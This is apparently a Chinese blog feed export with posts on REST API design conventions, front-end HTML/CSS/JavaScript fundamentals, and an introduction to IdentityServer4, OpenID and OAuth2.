<li><p>在设计过滤的参数时，业界也有一些事实标准可供参考。如果我们期望查询结果的特定属性取值跟过滤参数的取值完全相同，那过滤参数的名称通常为属性名；如果我们期望查询结果任意属性部分包含过滤参数的取值，那过滤参数的名称通常为 “q”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">完全符合：http://api.example.com/v1/users?name=ken</span><br><span class="line">全文搜索：http://api.example.com/v1/users?q=ken</span><br></pre></td></tr></table></figure>
</li>
<li><p>URI 是否可以包含动词 “search”？通常以搜索为主的在线服务 API 可以包含，除此之外建议采用名词复数形式。常用英文单词 “search” 和 “find” 都有查找的含义，但两者还是有一些细微的差别，其中 “search” 用于模糊搜索，而 “find” 用于精准查询。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模糊搜索：http://yboss.yahooapis.com/ysearch/web?q=ipod</span><br></pre></td></tr></table></figure>
</li>
<li><p>某个属性究竟是作为 URI 路径的构成元素还是作为查询参数呢？我们可以按照以下规则来判断：如果该属性信息可以唯一定位资源，那么它就适合作为路径构成元素，否则就作为查询参数；如果该属性可以省略，那么它就是适合作为查询参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">路径元素：http://api.example.com/v1/users/&#123;id&#125;</span><br><span class="line">查询参数：http://api.example.com/v1/users?name=ken</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="HTTP-方法"><a href="#HTTP-方法" class="headerlink" title="HTTP 方法"></a>HTTP 方法</h2><p>&emsp;&emsp;按照 HTTP 协议设计的本意，URI 用于标识被操作的目标对象（资源），而 HTTP 方法则是表示操作方法。基于 HTTP 协议的简单对象访问协议 SOAP 逐渐被 RESTful 的原生 HTTP 协议取代，我们也没有必要画蛇添足，最好就是吃透 HTTP 协议，充分利用它的特性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /v1/users/123 HTTP/1.1</span><br><span class="line">Host: api.example.com</span><br></pre></td></tr></table></figure>

<ul>
<li>GET，获取资源</li>
<li>POST，新增资源</li>
<li>PUT，更新已有资源</li>
<li>DELETE，删除资源</li>
<li>PATCH，更新部分资源</li>
<li>HEAD，获取资源的元信息</li>
</ul>
<p>&emsp;&emsp;如果遇到上述 HTTP 方法无法覆盖的场景，那通常是资源的设计粒度太大了，我们可以把粗粒度的资源分解成多个细粒度的资源。在使用 HTTP 协议设计 WEB API 的专业能力上，业界将其划分为四个层级，LEVEL3 相对较理想化，缺乏实施的基础，LEVEL2 是切实可行的：</p>
<ul>
<li>LEVEL 0：使用 HTTP</li>
<li>LEVEL 1：引入资源的概念</li>
<li>LEVEL 2：引入 HTTP 动词（GET/POST/PUT/DELETE 等）</li>
<li>LEVEL 3：引入 HATEOAS 概念</li>
</ul>
<h2 id="响应数据"><a href="#响应数据" class="headerlink" title="响应数据"></a>响应数据</h2><p>&emsp;&emsp;常用的数据格式有：HTML、XML、JSON、YAML 等，如果我们的服务在响应时支持不同类型的数据格式，那应用在调用服务时如何获得期望格式的响应数据呢？通常我们可以考虑采用下述几种指定数据格式的方法：</p>
<ul>
<li><p>使用查询参数的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：https://api.example.com/v1/users?format=xml</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用扩展名的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：https://api.example.com/v1/users.json</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用在请求首部指定媒体类型的方法，优先推荐此种方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /v1/users</span><br><span class="line">Host: api.example.com</span><br><span class="line">Accept: application/json</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>&emsp;&emsp;响应数据应该包含哪些信息呢？是否越多越好？亦或越少越好，仅仅包含 ID？建议是按需返回，根据业务功能所需返回相应的数据。如果一个 WEB API 需要提供给不同业务场景使用，不同业务场景对数据属性信息的要求不同，或多或少，这种情况我们可以让用户来选择响应的内容，选择方法就是通过查询参数指定：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：http://api.example.com/v1/users/123?fields=name,age</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;响应数据的结构应该尽量扁平化，不要嵌套太深，减少没有具体含义的信息载荷，这样既可以压缩报文尺寸，又可以节省带宽的。当然，如果层级结构更具优势，也可以采用。</p>
<h2 id="出错信息"><a href="#出错信息" class="headerlink" title="出错信息"></a>出错信息</h2><p>&emsp;&emsp;建议通过 HTTP 协议首部的状态码来表示出错信息，而不是再封装一层，遵守协议规范的好处是可以减少沟通的成本，也可以利用许多成熟的软硬件产品来处理异常出错信息。HTTP 协议定了了五种类型的状态码：</p>
<ul>
<li>1XX：消息</li>
<li>2XX：成功</li>
<li>3XX：重定向</li>
<li>4XX：客户端原因引起的错误</li>
<li>5XX：服务器端原因引起的错误</li>
</ul>
<p>&emsp;&emsp;我们需要每种状态码的使用场景，确保正确使用状态码。除此之外，服务还需要向客户端返回详细的出错信息，我们通常可以采用下述两种方法来传递详细的出错信息：</p>
<ul>
<li>方法 1：定义私有的首部，将其填入响应消息的首部。</li>
<li>方法 2：将详细的出错信息放入消息体。</li>
</ul>
<h2 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h2><p>&emsp;&emsp;随着业务的发展，每个发布上线的 WEB API 都存在更新修改的可能，那就需要引入版本管理的机制。业界有三种常见的标注 WEB API 版本的方法：</p>
<ul>
<li><p>在 URI 中嵌入版本编号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：http://api.linkedin.com/v1/people</span><br></pre></td></tr></table></figure>
</li>
<li><p>在查询字符串里加入版本信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：http://api.example.com/users/123?v=2</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过媒体类型来指定版本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept: application/vnd.github.v3+json</span><br><span class="line">Content-Type: application/vnd.github.v3+json</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>&emsp;&emsp;同样，版本编号也存在业界规范：语义化版本控制（Semantic Versioning）规范，网站地址：semver.org。版本编号由点号连接的 3 个数字组成，例如：1.2.3，分别表示主版本编号、次版本编号、补丁版本编号，版本编号的增加遵循下述规则：</p>
<ul>
<li>在对软件进行不向下兼容的变更时，增加主版本编号；</li>
<li>在对软件进行向下兼容的变更或废除某些特定的功能时，增加次版本编号；</li>
<li>如果软件的 API 没有发生变更，只是修正了部分 bug，则增加补丁版本编号。</li>
</ul>
<p>&emsp;&emsp;按照版本编号增长的规则，WEB API 的版本编号只需要标注主版本编号就可以了，因为次版本编号、补丁版本编号的增加都可以做到向下兼容，不会影响用户使用，唯有主版本编号增加才需要用户更新升级。除了标注版本信息之外，我们在对外发布 WEB API 时还需要设计好版本变更的策略，例如：老版本提供多久的过渡期、同时兼容多少个版本、特定版本的终止日期等等。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp;何为优美？就是符合大众审美的，对于 WEB API 来说，就是符合标准规范的，这有利于降低用户学习和使用的成本，便于交流，不存在隐没成本。通常，业界存在的标准规范和事实标准都是经过实践筛选出来的，从遵循模仿开始，然后再找机会创新，而不是一上来就重复发明轮子。<br>&emsp;&emsp;WEB API 设计领域的标准规范就是 URI、HTTP 等，我们要最大程度地利用这些协议规范，让每个 WEB API 都是用户友好（易于使用）、技术友好（支持缓存、易于更改）的。</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[前端开发必备技能 —— 三大基础层]]></title>
      <url>/2019/12/26/FrontEndThreeInfrastructures/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://mp.weixin.qq.com/s/_jsGJG8sbpwkVxhOwTaXtA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_jsGJG8sbpwkVxhOwTaXtA</a></p>
</blockquote>
<p>&emsp;&emsp;前端简单说就是我们能够看到的东西，比如页面内容，颜色，图片等，后端主要负责的是后台数据的传输等。前端页面主要分为三层：结构层（Html）、表示层（CSS）、应用层（JavaScript）。</p>
<a id="more"></a>

<h1 id="HTML（结构层），用-HTML-实现页面结构"><a href="#HTML（结构层），用-HTML-实现页面结构" class="headerlink" title="HTML（结构层），用 HTML 实现页面结构"></a>HTML（结构层），用 HTML 实现页面结构</h1><p>&emsp;&emsp;HTML（Hyper Text Markup Language，超文本标记语言），用来描述网页的一种语言，它不是一种编程语言，而是一种标记语言（标记标签），总的来说，HTML 使用标记标签来描述网页，而我们上网所看到网页，多数都是由 HTML 写成的。<br>&emsp;&emsp;“超文本”是指页面内可以包含图片、链接甚至音视频、程序等非文字元素。<br>&emsp;&emsp;“标记”指的是这些超文本必须由包含属性的开头与结尾标志来标记。<br>&emsp;&emsp;浏览器通过解码 HTML，就可以把网页内容显示出来，它也构成了互联网兴起的基础。  </p>
<h2 id="HTML-的基本结构"><a href="#HTML-的基本结构" class="headerlink" title="HTML 的基本结构"></a>HTML 的基本结构</h2><figure class="image-box">
                <img src="1.webp" alt title class>
                <p></p>
            </figure>

<h2 id="标签的三大分类"><a href="#标签的三大分类" class="headerlink" title="标签的三大分类"></a>标签的三大分类</h2><ol>
<li>块级元素<br><code>div</code>，默认占整行，宽高可设，但设完后，还是占整行</li>
<li>行内块元素<br><code>img</code>，不默认占整行，宽和高由自身内容决定，宽高可设</li>
<li>行内元素<br><code>b</code>、<code>span</code>，不默认占整行，宽和高由自身内容决定，宽高不可设</li>
</ol>
<h2 id="HTML-页面包含内容"><a href="#HTML-页面包含内容" class="headerlink" title="HTML 页面包含内容"></a>HTML 页面包含内容</h2><ol>
<li>文本<figure class="image-box">
                <img src="2.webp" alt title class>
                <p></p>
            </figure></li>
<li>超文本<br>“超文本”是指页面内可以包含图片、链接，甚至音乐、程序等非文字元素</li>
</ol>
<h2 id="HTML-常用标签"><a href="#HTML-常用标签" class="headerlink" title="HTML 常用标签"></a>HTML 常用标签</h2><ol>
<li><code>&lt;!DOCTYPE html&gt;</code><br>doc（document 文档），type（类型）声明文档类型，在浏览器打开的时候，告诉浏览器这是一个什么文件。</li>
<li><code>&lt;html&gt; &lt;/html&gt;</code> 根标签，双标签<br><code>&lt;html&gt;</code> 是开始标签，<code>&lt;/html&gt;</code> 是结束标签 / 闭合标签</li>
<li><code>&lt;head&gt; &lt;/head&gt;</code> 头部标签</li>
<li><code>&lt;body&gt; &lt;/body&gt;</code> 身体标签</li>
<li><code>&lt;title&gt; &lt;/title&gt;</code> 标题标签</li>
<li><code>&lt;meta&gt;</code> 设置标签<br><code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>  charset 用来设置编码格式，utf-8 汉字</li>
<li><code>&lt;img src=&quot;img/....jpg&quot;/&gt;</code><br>img 图像标签，用来引入图片，路径由 src 来引入。  </li>
<li><code>&lt;link&gt;</code> 外部引入</li>
<li><code>&lt;b&gt; &lt;/b&gt;</code> 加粗文字</li>
<li><code>&lt;button&gt; &lt;/button&gt;</code> 按钮标签 </li>
<li><code>&lt;br /&gt;</code> br 换行</li>
</ol>
<h1 id="CSS（表示层），用-CSS-完成页面的表现与风格"><a href="#CSS（表示层），用-CSS-完成页面的表现与风格" class="headerlink" title="CSS（表示层），用 CSS 完成页面的表现与风格"></a>CSS（表示层），用 CSS 完成页面的表现与风格</h1><p>&emsp;&emsp;CSS（Cascading Style Sheets，层叠样式表）是一种用来表现 HTML（标准通用标记语言的一个应用）或 XML（标准通用标记语言的一个子集）等文件样式的计算机语言。<br>&emsp;&emsp;CSS 主要负责页面中各个部分的样式，如：字体大小、颜色，布局等。CSS 样式可以放到 HTML 页面中，也可以单独的放到 CSS 文件中。<br>&emsp;&emsp;CSS 不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。  </p>
<h2 id="样式引入的方式"><a href="#样式引入的方式" class="headerlink" title="样式引入的方式"></a>样式引入的方式</h2><ol>
<li>行内样式：就是把样式属性写到标签里 <code>style=&quot;&quot;</code></li>
<li>内部样式：head 标签里引入 style 标签</li>
<li>外部样式：link 元素</li>
</ol>
<h2 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h2><ol>
<li>class（命名）：类，不具有唯一性，<code>.</code> 代表 <code>class</code></li>
<li>id：特指、具体，具有唯一性，<code>#</code> 代表 <code>id</code></li>
</ol>
<h2 id="属性（直接属性、间接属性）"><a href="#属性（直接属性、间接属性）" class="headerlink" title="属性（直接属性、间接属性）"></a>属性（直接属性、间接属性）</h2><ol>
<li>宽度：<code>width</code></li>
<li>高度：<code>height</code>，单位是 px，像素</li>
<li>背景颜色：<code>background-color</code></li>
<li>背景图片：<code>background-image</code>，用 <code>url</code> 引入路径</li>
<li>背景大小：<code>background-size</code></li>
<li>字体颜色：<code>color</code></li>
<li>转换元素：<code>display</code></li>
</ol>
<h2 id="转换元素"><a href="#转换元素" class="headerlink" title="转换元素"></a>转换元素</h2><ol>
<li><code>display:block</code> 块级元素</li>
<li><code>display:inline-block</code> 行内块元素</li>
<li><code>display:inline</code> 行内元素</li>
</ol>
<figure class="image-box">
                <img src="3.webp" alt title class>
                <p></p>
            </figure>

<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><ol>
<li>新建：<code>Ctrl+N</code></li>
<li>隐藏辅助线：<code>Ctrl+H</code></li>
<li>注释：<code>Ctrl+？</code></li>
<li>空格：<code>Tab</code></li>
</ol>
<h2 id="图片格式"><a href="#图片格式" class="headerlink" title="图片格式"></a>图片格式</h2><ol>
<li>有背景图案存成 jpg 格式</li>
<li>没有背景图案存成 png 格式</li>
</ol>
<h1 id="JavaScript（行为层），用-js-脚本语言，实现一些客户端的功能与业务"><a href="#JavaScript（行为层），用-js-脚本语言，实现一些客户端的功能与业务" class="headerlink" title="JavaScript（行为层），用 js 脚本语言，实现一些客户端的功能与业务"></a>JavaScript（行为层），用 js 脚本语言，实现一些客户端的功能与业务</h1><p>&emsp;&emsp;JavaScript是一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型，包含类似 java 的语法（数据类型，数组，条件分支，循环，对象…），它的解释器被称为 JavaScript 引擎，为浏览器的一部分，广泛用于客户端的脚本语言，是连接前台和后台服务器的桥梁，它是操纵 HTML 的能手，为页面添加各种操作，使页面具有动态功能。如我们在页面上看到的按钮单击后的页面跳转或者弹不出的对话框、警告框等，都是通过 JavaScript（下面简称 “JS”）实现的。</p>
<h2 id="JS的组成"><a href="#JS的组成" class="headerlink" title="JS的组成"></a>JS的组成</h2><ol>
<li>ECMAScript（核心），JavaScript 语言基础</li>
<li>DOM（文档对象模型），规定了访问 HTML 和 XML 的接口</li>
<li>BOM（浏览器对象模型），提供了浏览器窗口之间进行交互的对象和方法</li>
</ol>
<h2 id="JS的基本数据类型和引用数据类型"><a href="#JS的基本数据类型和引用数据类型" class="headerlink" title="JS的基本数据类型和引用数据类型"></a>JS的基本数据类型和引用数据类型</h2><ol>
<li>基本数据类型：<code>undefined</code>、<code>null</code>、<code>boolean</code>、<code>number</code>、<code>string</code>、<code>symbol</code></li>
<li>引用数据类型：<code>object</code>、<code>array</code>、<code>function</code></li>
</ol>
<h2 id="检测浏览器版本的方式"><a href="#检测浏览器版本的方式" class="headerlink" title="检测浏览器版本的方式"></a>检测浏览器版本的方式</h2><ol>
<li>根据 <code>navigator.userAgent</code> / <code>UA.toLowerCase.indexOf(‘chrome’)</code></li>
<li>根据 window 对象的成员 <code>‘ActiveXObject’ in window</code></li>
</ol>
<h2 id="JS-有哪些内置对象"><a href="#JS-有哪些内置对象" class="headerlink" title="JS 有哪些内置对象"></a>JS 有哪些内置对象</h2><ol>
<li>数据封装类对象：<code>Object</code>、<code>Array</code>、<code>Boolean</code>、<code>Number</code>、<code>String</code></li>
<li>其他对象：<code>Function</code>、<code>Arguments</code>、<code>Math</code>、<code>Date</code>、<code>RegExp</code>、<code>Error</code></li>
<li>ES6新增对象：<code>Symbol</code>、<code>Map</code>、<code>Set</code>、<code>Promises</code>、<code>Proxy</code>、<code>Reflect</code></li>
</ol>
<h2 id="JS-的基本规范"><a href="#JS-的基本规范" class="headerlink" title="JS 的基本规范"></a>JS 的基本规范</h2><ol>
<li>代码缩进，建议使用 “四个空格” 缩进</li>
<li>代码段使用花括号 <code>{}</code> 包裹</li>
<li>语句结束使用分号 <code>;</code>； 变量和函数在使用前进行声明</li>
<li>以大写字母开头命名构造函数，全大写命名常量</li>
<li>规范定义 JSON 对象，补全双引号；用 <code>{}</code> 和声明对象和数组</li>
</ol>
<h2 id="如何编写高性能的-JS"><a href="#如何编写高性能的-JS" class="headerlink" title="如何编写高性能的 JS"></a>如何编写高性能的 JS</h2><ol>
<li>遵循严格模式：<code>&quot;use strict&quot;</code></li>
<li>将 js 脚本放在页面底部，加快渲染页面</li>
<li>将 js 脚本将脚本成组打包，减少请求</li>
<li>使用非阻塞方式下载 js 脚本</li>
<li>尽量使用局部变量来保存全局变量</li>
<li>尽量减少使用闭包</li>
<li>使用 window 对象属性方法时，省略 window</li>
<li>尽量减少对象成员嵌套；缓存 DOM 节点的访问</li>
<li>通过避免使用 eval 和 Function 构造器</li>
<li>给 setTimeout 和 setInterval 传递函数而不是字符串作为参数</li>
<li>尽量使用直接量创建对象和数组</li>
<li>最小化重绘（repaint）和回流（reflow</li>
</ol>
<h2 id="浏览器的渲染"><a href="#浏览器的渲染" class="headerlink" title="浏览器的渲染"></a>浏览器的渲染</h2><h3 id="浏览器的渲染过程："><a href="#浏览器的渲染过程：" class="headerlink" title="浏览器的渲染过程："></a>浏览器的渲染过程：</h3><ol>
<li>解析 HTML 构建 DOM（DOM 树），并行请求 css / image / js</li>
<li>CSS 文件下载完成，开始构建 CSSOM（CSS 树） </li>
<li>CSSOM 构建结束后，和 DOM 一起生成 Render Tree（渲染树） </li>
<li>布局（Layout）：计算出每个节点在屏幕中的位置</li>
<li>显示（Painting）：通过显卡把页面画到屏幕上</li>
</ol>
<h3 id="DOM-树和渲染树的区别"><a href="#DOM-树和渲染树的区别" class="headerlink" title="DOM 树和渲染树的区别"></a>DOM 树和渲染树的区别</h3><ol>
<li>DOM 树与 HTML 标签一一对应，包括 head 和隐藏元素；</li>
<li>渲染树不包括 head 和隐藏元素，大段文本的每一个行都是独立节点，每一个节点都有对应的 css 属性。</li>
</ol>
<h2 id="重绘和回流（重排）的区别和关系"><a href="#重绘和回流（重排）的区别和关系" class="headerlink" title="重绘和回流（重排）的区别和关系"></a>重绘和回流（重排）的区别和关系</h2><ol>
<li>重绘：当渲染树中的元素外观（如：颜色）发生改变，不影响布局时，产生重绘；</li>
<li>回流：当渲染树中的元素的布局（如：尺寸、位置、隐藏/状态状态）发生改变时，产生重绘回流；</li>
<li>注意：JS 获取 Layout 属性值（如：offsetLeft、scrollTop、getComputedStyle 等）也会引起回流。因为浏览器需要通过回流计算最新值。回流必将引起重绘，而重绘不一定会引起回流。</li>
</ol>
<h2 id="如何最小化重绘（repaint）和回流（reflow）"><a href="#如何最小化重绘（repaint）和回流（reflow）" class="headerlink" title="如何最小化重绘（repaint）和回流（reflow）"></a>如何最小化重绘（repaint）和回流（reflow）</h2><ol>
<li>需要要对元素进行复杂的操作时，可以先隐藏（<code>display:“none”</code>），操作完成后再显示；</li>
<li>需要创建多个 DOM 节点时，使用 DocumentFragment 创建完后一次性的加入 document；</li>
<li>缓存 Layout 属性值，如：<code>var left = elem.offsetLeft;</code> 这样，多次使用 left 只产生一次回流；</li>
<li>尽量避免用 table 布局（table 元素一旦触发回流就会导致 table 里所有的其它元素回流）；</li>
<li>避免使用 css 表达式（expression），因为每次调用都会重新计算值（包括加载页面）；</li>
<li>尽量使用 css 属性简写，如：用 <code>border</code> 代替 <code>border-width</code>, <code>border-style</code>, <code>border-color</code>；</li>
<li>批量修改元素样式：<code>elem.className</code> 和 <code>elem.style.cssText</code> 代替 <code>elem.style.xxx</code>；</li>
</ol>
<h2 id="script-的位置是否会影响首屏显示时间"><a href="#script-的位置是否会影响首屏显示时间" class="headerlink" title="script 的位置是否会影响首屏显示时间"></a>script 的位置是否会影响首屏显示时间</h2><ol>
<li>在解析 HTML 生成 DOM 过程中，js 文件的下载是并行的，不需要 DOM 处理到 script 节点；因此，script 的位置不影响首屏显示的开始时间。</li>
<li>浏览器解析 HTML 是自上而下的线性过程，script 作为 HTML 的一部分同样遵循这个原则；因此，script 会延迟 DomContentLoad，只显示其上部分首屏内容，从而影响首屏显示的完成时间。</li>
</ol>
<h2 id="解释-JS-中的作用域与变量声明提升"><a href="#解释-JS-中的作用域与变量声明提升" class="headerlink" title="解释 JS 中的作用域与变量声明提升"></a>解释 JS 中的作用域与变量声明提升</h2><ol>
<li>JavaScript作用域：<br>&emsp;&emsp;在 Java、C 等语言中，作用域为 <code>for</code> 语句、<code>if</code> 语句或 <code>{}</code> 内的一块区域，称为作用域；而在 JavaScript 中，作用域为 <code>function{}</code> 内的区域，称为函数作用域。</li>
<li>JavaScript 变量声明提升：<br>&emsp;&emsp;在 JavaScript 中，函数声明与变量声明经常被 JavaScript 引擎隐式地提升到当前作用域的顶部。声明语句中的赋值部分并不会被提升，只有名称被提升函数声明的优先级高于变量，如果变量名跟函数名相同且未赋值，则函数声明会覆盖变量声明，如果函数有多个同名参数，那么最后一个参数（即使没有定义）会覆盖前面的同名参数。</li>
</ol>
<h2 id="JS-的原型、原型链以及特点"><a href="#JS-的原型、原型链以及特点" class="headerlink" title="JS 的原型、原型链以及特点"></a>JS 的原型、原型链以及特点</h2><ol>
<li>原型：JavaScript 的所有对象中都包含了一个 <code>[proto]</code> 内部属性，这个属性所对应的就是该对象的原型，JavaScript的函数对象，除了原型 <code>[proto]</code> 之外，还预置了 <code>prototype</code> 属性，当函数对象作为构造函数创建实例时，该 <code>prototype</code> 属性值将被作为实例对象的原型 <code>[proto]</code>。</li>
<li>原型链：当一个对象调用的属性 / 方法自身不存在时，就会去自己 <code>[proto]</code> 关联的前辈 <code>prototype</code> 对象上去找，如果没找到，就会去该 <code>prototype</code> 原型 <code>[proto]</code> 关联的前辈 <code>prototype</code> 去找。依此类推，直到找到属性 / 方法或 undefined 为止。从而形成了所谓的“原型链”。</li>
<li>原型特点：<code>JavaScript</code> 对象是通过引用来传递的，当修改原型时，与之相关的对象也会继承这一改变。</li>
</ol>
<h2 id="JS-数据类型"><a href="#JS-数据类型" class="headerlink" title="JS 数据类型"></a>JS 数据类型</h2><ol>
<li>原始数据类型（Undefined，Null，Boolean，Number、String）—— 栈</li>
<li>引用数据类型（对象、数组和函数）—— 堆</li>
</ol>
<p>两种类型的区别：<br>&emsp;&emsp;存储位置不同。原始数据类型是直接存储在栈（stack）中的简单数据段，占据空间小、大小固定，属于被频繁使用数据；引用数据类型存储在堆（heap）中的对象，占据空间大、大小不固定，如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体。  </p>
<h2 id="this对象"><a href="#this对象" class="headerlink" title="this对象"></a>this对象</h2><p><code>this</code> 总是指向函数的直接调用者，如果有 <code>new</code> 关键字，<code>this</code> 指向 <code>new</code> 出来的实例对象，在事件中，<code>this</code> 指向触发这个事件的对象，IE 下 <code>attachEvent</code> 中的 <code>this</code> 总是指向全局对象 <code>Window</code>。</p>
<h2 id="eval-是做什么的"><a href="#eval-是做什么的" class="headerlink" title="eval 是做什么的"></a>eval 是做什么的</h2><p><code>eval</code> 的功能是把对应的字符串解析成 JS 代码并运行，个人感觉应该避免使用 <code>eval</code>，不安全，非常耗性能（先解析成 js 语句，再执行），由 JSON 字符串转换为 JSON 对象的时候可以用 <code>eval(’(’+ str +’)’)</code>。</p>
<h2 id="Window-对象和-Document-对象"><a href="#Window-对象和-Document-对象" class="headerlink" title="Window 对象和 Document 对象"></a>Window 对象和 Document 对象</h2><ol>
<li><code>Window</code> 对象表示当前浏览器的窗口，是 JavaScript 的顶级对象，我们创建的所有对象、函数、变量都是 <code>Window</code> 对象的成员，<code>Window</code> 对象的方法和属性是在全局范围内有效的；</li>
<li><code>Document</code> 对象是 HTML 文档的根节点与所有其他节点（元素节点，文本节点，属性节点, 注释节点），<code>Document</code> 对象使我们可以通过脚本对HTML页面中的所有元素进行访问，<code>Document</code> 对象是 <code>Window</code> 对象的一部分，可通过 <code>window.document</code> 属性对其进行访问。</li>
</ol>
<h2 id="原生-js、js-库、js-框架和-js-插件"><a href="#原生-js、js-库、js-框架和-js-插件" class="headerlink" title="原生 js、js 库、js 框架和 js 插件"></a>原生 js、js 库、js 框架和 js 插件</h2><ol>
<li>原生 js，是指最基础的 js，没有封装过，但因为各浏览器对 js 的支持不同，就导致用基础的 js 编程需要为不同的浏览器写兼容代码；</li>
<li>js 库、js 框架，是指集成一系列 DOM 操作，API 封装，界面 UI 封装的的库类，常见的有 jQuery，extjs 等等，使用 js 库可以解决浏览器之间的兼容问题，简化 JS 代码；</li>
<li>js 插件，就是集成了帮助程序员轻松完成功能的程序。js 插件用得比较多，网页制作上随处可见，如图片轮换功能，导航制作，上传图片等等。</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web </tag>
            
            <tag> HTML </tag>
            
            <tag> CSS </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IdentityServer4 学习笔记汇总]]></title>
      <url>/2019/12/26/LearningIdentityServer4/</url>
      <content type="html"><![CDATA[<blockquote>
<p>待更新</p>
</blockquote>
<blockquote>
<p><a href="https://www.cnblogs.com/linhuiy/p/12084933.html" target="_blank" rel="noopener">https://www.cnblogs.com/linhuiy/p/12084933.html</a></p>
</blockquote>
<a id="more"></a>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;互联网时代，对信息和资源的保护越发苛刻，在所有应用中授权和认证是必不可少缺少的一部分。如果一个应用没有授权和认证那么这个应用就是不完整或者说不安全的应用。在 .Net 平台给我们提供了一套完整的授权认证框架，那就是 IdentityServer4。它实现了 OpenId Connect 和 OAuth2.0 协议的认证授权。</p>
<figure class="image-box">
                <img src="1.png" alt title class>
                <p></p>
            </figure>

<h1 id="授权认证"><a href="#授权认证" class="headerlink" title="授权认证"></a>授权认证</h1><p>&emsp;&emsp;很多人喜欢把授权和认证混为一谈，但是其实授权（Authorization）和认证（Authentication）是有区别的。</p>
<ul>
<li>Authorization（授权） - 侧重点是用户能干嘛，而不关心用户是谁。</li>
<li>Authentication（认证） - 侧重点是用户是谁，而不是用户能干嘛。</li>
</ul>
<h1 id="OpenId"><a href="#OpenId" class="headerlink" title="OpenId"></a>OpenId</h1><p>&emsp;&emsp;OpenID 是一个以用户为中心的数字身份识别框架，是一个以 URL 为身份标识的分散式身份验证解决方案，它具有开放、分散、自由等特性。  </p>
<p>OpenID相关基本术语：</p>
<ul>
<li>用户 - 想要向某个网站表明身份的人。</li>
<li>标识 - 用户用以标识其身份的URL。</li>
<li>身份提供者 - 提供 OpenID URL 注册和验证服务的服务提供者。</li>
<li>依赖方 - 想要对最终用户的 OpenId 进行验证的网站应用。</li>
</ul>
<p>&emsp;&emsp;举个例子，我使用 QQ（身份提供者）登陆京东（依赖方），我打开京东主页点击 QQ 登陆并不会要我输入我的 QQ 账号和密码，会先跳转到 QQ 授权登陆页面，当你扫码或者密码登陆的时候 QQ 会返回给京东一个 OpenId，京东就会拿着这个 OpenId 来问 QQ 你这里是不是有这么一个用户。<br>&emsp;&emsp;OpenId 关注的是 Authentication（认证）。  </p>
<h1 id="OAuth2"><a href="#OAuth2" class="headerlink" title="OAuth2"></a>OAuth2</h1><p>&emsp;&emsp;OAuth 是当下比较流行的授权第三方应用读取用户的资源的机制。OAuth 能在不涉及到用户的账号信息的情况下，读取用户的一些资源信息。<br>&emsp;&emsp;举个例子，每周都会有保洁阿姨来家里打扫，但是保洁阿姨并不知道我家大门的密码，所以每次保洁阿姨在要上门的时候会在 app 上申请获取一个临时密码，当我收到保洁阿姨的申请后，确认给予临时密码后保洁阿姨就能通过这个密码进入房子啦。<br>&emsp;&emsp;我就是用户，家，和房间就是我的资源，临时密码是 token。阿姨是第三方应用。阿姨申请临时密码需要进入我的家（第三方应用申请读取我的数据），我（用户）收到申请后给予临时密码（用户确认授权读取数据）。阿姨收到临时密码进入房间（获取到相应的 token 读取数据）。<br>&emsp;&emsp;但是临时密码（token）还是有很多局限性的，比如时效性（规定时间内使用才有效），局限性（只能开一次门，不能进去我私人房间），我还可以在中途撤销授权，使临时密码（token）无法进去我的房间（无法读取我的数据）。</p>
<figure class="image-box">
                <img src="2.png" alt title class>
                <p></p>
            </figure> 

